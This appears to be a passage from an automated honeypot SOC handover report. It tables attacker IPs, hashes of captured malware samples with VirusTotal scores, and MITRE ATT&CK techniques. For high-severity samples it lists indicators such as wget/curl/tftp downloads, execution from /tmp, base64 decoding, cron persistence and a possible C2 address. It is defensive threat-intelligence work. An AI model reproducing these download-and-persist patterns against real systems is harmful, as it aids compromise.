| `34.14.70[.]97` | **10** | 2026-06-30 13:47 | 2026-06-30 13:47 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `47.120.4[.]180` | **3** | 2026-06-30 13:45 | 2026-06-30 13:49 | 5m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **3** | 2026-06-30 13:26 | 2026-06-30 15:38 | 2m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-06-30 13:46 | 2026-06-30 15:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.155.77[.]148` | 1 | 2026-06-30 13:47 | 2026-06-30 13:47 | 9s | 0 | `T1592` | 🟢 LOW |
| `106.74.128[.]226` | 1 | 2026-06-30 15:59 | 2026-06-30 15:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `108.30.152[.]216` | 1 | 2026-06-30 13:48 | 2026-06-30 13:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `111.29.38[.]32` | 1 | 2026-06-30 16:20 | 2026-06-30 16:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.165[.]93` | 1 | 2026-06-30 16:13 | 2026-06-30 16:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.44[.]249` | 1 | 2026-06-30 15:56 | 2026-06-30 15:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]162` | 1 | 2026-06-30 15:49 | 2026-06-30 15:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]215` | 1 | 2026-06-30 16:33 | 2026-06-30 16:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.22[.]219` | 1 | 2026-06-30 14:02 | 2026-06-30 14:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.215.52[.]45` | 1 | 2026-06-30 16:14 | 2026-06-30 16:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.140[.]39` | 1 | 2026-06-30 15:48 | 2026-06-30 15:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.230.42[.]17` | 1 | 2026-06-30 15:19 | 2026-06-30 15:20 | 46s | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-06-30 15:56 | 2026-06-30 15:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.242.169[.]108` | 1 | 2026-06-30 13:33 | 2026-06-30 13:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `203.25.208[.]110` | 1 | 2026-06-30 16:03 | 2026-06-30 16:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]81` | 1 | 2026-06-30 13:29 | 2026-06-30 13:30 | 60s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-06-30 14:17 | 2026-06-30 14:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]111` | 1 | 2026-06-30 13:24 | 2026-06-30 13:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.226.17[.]34` | 1 | 2026-06-30 15:28 | 2026-06-30 15:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.81.126[.]27` | 1 | 2026-06-30 16:30 | 2026-06-30 16:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-06-30 13:08 | 2026-06-30 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-06-30 16:04 | 2026-06-30 16:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-06-30 13:32 | 2026-06-30 13:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-06-30 14:33 | 2026-06-30 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-06-30 15:39 | 2026-06-30 15:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]38` | 1 | 2026-06-30 13:47 | 2026-06-30 13:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-06-30 14:23 | 2026-06-30 14:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]10` | 1 | 2026-06-30 14:26 | 2026-06-30 14:26 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 49/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 50/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `111.29.38[.]32` | CN | China Mobile Communications Corporation | **100** ⚠️ | 22 |
| `151.60.88[.]74` | IT | WIND TRE S.P.A. | **100** ⚠️ | 0 |
| `104.155.77[.]148` | BE | Google LLC | **100** ⚠️ | 0 |
| `212.8.242[.]38` | NL | WorldStream B.V. | **100** ⚠️ | 27 |
| `45.79.115[.]59` | US | Linode | **100** ⚠️ | 50 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `115.190.165[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `47.120.4[.]180` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 11 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 189 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 171 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 32 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 16 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 294 cases |
| Tool 34  | Credential Extractor        | ✅ 206 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 82 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (2.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 40 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 171 priority case(s) shown individually · 35 recon entry/entries in table (7 group(s) consolidating 88 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-30T18:01:05Z_
